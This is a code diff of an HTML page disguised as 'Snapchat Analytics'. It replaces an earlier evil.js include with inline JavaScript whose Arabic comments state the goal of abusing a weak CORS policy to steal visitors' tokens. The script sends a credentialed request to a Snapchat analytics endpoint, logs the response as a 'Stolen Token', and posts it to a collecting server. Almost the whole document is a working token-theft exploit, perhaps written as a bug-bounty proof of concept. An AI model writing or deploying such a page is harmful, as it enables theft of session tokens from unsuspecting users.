@@ -1,10 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Snapchat Support</title>
+    <title>Snapchat Analytics</title>
 </head>
 <body>
-    <h1>Loading...</h1>
-    <script src="evil.js"></script>
+    <h1>Loading your analytics...</h1>
+
+    <script>
+        // هدفنا: استغلال CORS لسرقة token من زائر الموقع
+        fetch('https://us-central1-gcp.api.snapchat.com/web-analytics/web/init_client', {
+            method: 'POST',
+            credentials: 'include', // يرسل أي cookies مرتبطة بـ snapchat.com
+            headers: {
+                'Origin': 'https://github.snappublisher.snapchat.com', // هذا الأصل مسموح به بسبب CORS الضعيف
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({}) // قد تحتاج إلى بيانات محددة، اتركها فارغة أولاً
+        })
+        .then(response => response.json())
+        .then(data => {
+            // data تحتوي على الـ token والـ cid!
+            console.log("Stolen Token:", data);
+
+            // إثبات السرقة: أرسل البيانات إلى خادمك الخاص
+            fetch('http://localhost:8000', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    stolen_token: data,
+                    victim: "User visiting github.snappublisher.snapchat.com"
+                })
+            });
+        })
+        .catch(error => console.error('Error:', error));
+    </script>
 </body>
 </html>
